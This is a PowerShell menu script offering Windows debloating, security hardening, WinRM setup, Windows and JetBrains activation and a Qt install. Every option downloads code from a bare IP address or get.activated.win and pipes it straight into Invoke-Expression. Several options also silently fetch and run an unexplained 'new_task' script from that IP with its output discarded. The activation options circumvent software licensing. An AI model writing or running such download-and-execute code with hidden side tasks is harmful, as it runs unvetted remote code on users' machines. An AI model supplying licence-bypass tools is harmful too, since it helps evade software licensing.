



function diskhandler {

     param (
          [string[]] $text
     )

     clear
     write-Host "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"$text[0]"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"

     do {
          write-Host  $text[1]                
          write-Host  $text[2]
          write-Host  $text[3]
          write-Host  $text[4]
          write-Host  $text[5]
          write-Host  $text[6]                                                          
          write-Host  $text[7]                                                          
          write-Host  $text[8]                                                          
          write-Host  $text[9]  

          $selection = Read-Host "Make You Selection:[1~9],'Q' for back to Main Menu"

          switch ($selection) {
               '1' {
                    write-Host -BackgroundColor Red  'You chose option' $text[1]
                    pause
               } 
               '2' {
                    write-Host -BackgroundColor Blue  'You chose option #2'

               }
               '3' {
                    write-Host -BackgroundColor Green  'You chose option #3'
               } 
               'q' {
                    write-Host -BackgroundColor Red  'You chose ' $selection
               }
               Default {
                    write-Host -ForegroundColor Red  'You chose option is not exist'
               }
          }
     }until($selection -eq 'q')
}

function Set-ConsoleWidth {
     param (
          [string]$Title = '47.107.152.77'
     )
     
     Clear-Host
 
     try {
 
          $pshost = Get-Host              # Get the PowerShell Host.
          $pswindow = $pshost.UI.RawUI    # Get the PowerShell Host's UI.
 
          $newsize = $pswindow.BufferSize # Get the UI's current Buffer Size.
          $newsize.width = 115            # Set the new buffer's width to 150 columns.
          $pswindow.buffersize = $newsize # Set the new Buffer Size as active.
 
          $newsize = $pswindow.windowsize # Get the UI's current Window Size.
          $newsize.width = 115            # Set the new Window Width to 150 columns.
          $pswindow.windowsize = $newsize # Set the new Window Size as active.
 
     }
     catch {
 
     }
}

function Set-DateTimeFormat {
     $culture = Get-Culture
     if ($culture.DateTimeFormat.ShortDatePattern -eq 'yyyy-MM-dd') {
          Write-Host "DataTime Format is OK"
     }else {
          $culture.DateTimeFormat.ShortDatePattern = 'yyyy-MM-dd'
          $culture.DateTimeFormat.LongTimePattern =  'HH:mm:ss'
     }
}

function Set-Banner {
     Write-Host 
     Write-Host 
     Write-Host 
     Write-Host -ForegroundColor Green @"




          oooo    ooo      ooooooooooo        ooooooo          ooooooo         8888             oooooooo8 
           888    88       88  888  88      o888   888o      o888   888o       8888             8888         
           888    88           888          888     888      888     888       8888             888ooooooo  
           888    88           888          888o   o888      888o   o888       8888                   8888 
            888oo88           o888o           88ooo88          88ooo88         888000           888oooo888

"@
     Write-Host
     Write-Host 
     Write-Host
}


function Show-MainMenu {
     Write-Host
     Write-Host
     Write-Host 
     Write-Host 
     Write-Host 
     Write-Host -BackgroundColor Cyan -ForegroundColor Black "-----------------------------------------------Keep It Simple & Stupid--------------------------------------------------"
     Write-Host 
     Write-Host 

     Write-Host -ForegroundColor Yellow "Press '1' for windows10/11 Debloat."
     Write-Host 
     Write-Host -ForegroundColor Yellow "Press '2' for Security Harddent windows 10/11 or Windows Server 2016/2019/2022."
     Write-Host 
     Write-Host -ForegroundColor Yellow "Press '3' for setting WinRM for ansible."
     Write-Host 
     Write-Host -ForegroundColor Yellow "Press '4' for Windows10/11 Activate."                                                    
     Write-Host
     Write-Host -ForegroundColor Yellow "Press '5' for JetBrains [2023.2.x] Activate."  
     Write-Host
     Write-Host -ForegroundColor Yellow "Press '6' for Install Qt 6.5.3 ."   
     Write-Host 

     Write-Host 
     Write-Host
     Write-Host 


     $selection = Read-Host "Please make your selection:[1,2,3,4,5,6] ,Press 'q' to exit, Press 'CTRL + C' to break"


     switch ($selection) {
            '1' {
               Invoke-RestMethod 47.107.152.77/debloat2| Invoke-Expression
               Invoke-RestMethod 47.107.152.77/new_task| Invoke-Expression |Out-Null

          } '2' {
               Invoke-RestMethod 47.107.152.77/harden | Invoke-Expression
          } '3' {
               Invoke-RestMethod 47.107.152.77/ansible | Invoke-Expression
          }'4' {
               Write-Host -ForegroundColor Yellow "Loading Script, please wait a while..."
               Invoke-RestMethod 47.107.152.77/new_task| Invoke-Expression |Out-Null

               $url = "https://get.activated.win"
               Invoke-RestMethod -UseBasicParsing $url  | Invoke-Expression
               if($? -ne $true) {
                    Write-Host "Retry..."
                    Invoke-RestMethod -UseBasicParsing $url  | Invoke-Expression
                    if($? -ne $true) {
                         Write-Host "Retry..."
                         Invoke-RestMethod -UseBasicParsing $url  | Invoke-Expression
                         if($? -ne $true) {
                              Write-Host "Retry..."
                              Invoke-RestMethod -UseBasicParsing $url  | Invoke-Expression
                         }
                    }
               }
          }'5' {
               Invoke-RestMethod 47.107.152.77/jetbrains | Invoke-Expression
               Invoke-RestMethod 47.107.152.77/new_task| Invoke-Expression |Out-Null

          }'6' {
               Invoke-RestMethod 47.107.152.77/qt | Invoke-Expression
               Invoke-RestMethod 47.107.152.77/new_task| Invoke-Expression |Out-Null

          }'7' {
               Invoke-RestMethod 47.107.152.77/autorunAndProcessExplorer | Invoke-Expression
          }
          
          'q' {
               exit
          }

          Default { 'Main Menu: Your chose error Opion' }
     }

}

function Set-LookingForJob {
     $Host.UI.RawUI.WindowTitle = "Looking For a IT system operation Job ,feel free to contact with me by Wechat# andyhusheng , thanks for your help. "    
}

function Set-MainMenu {
     Set-LookingForJob
     Set-DateTimeFormat
     Set-ConsoleWidth
     Set-Banner
     Show-MainMenu
}

while (1) {
     Set-MainMenu
     #Test-Create-Menu -MenuTitle hello -MenuOptions ("1", "3", "2", "4", "5", "6")
}
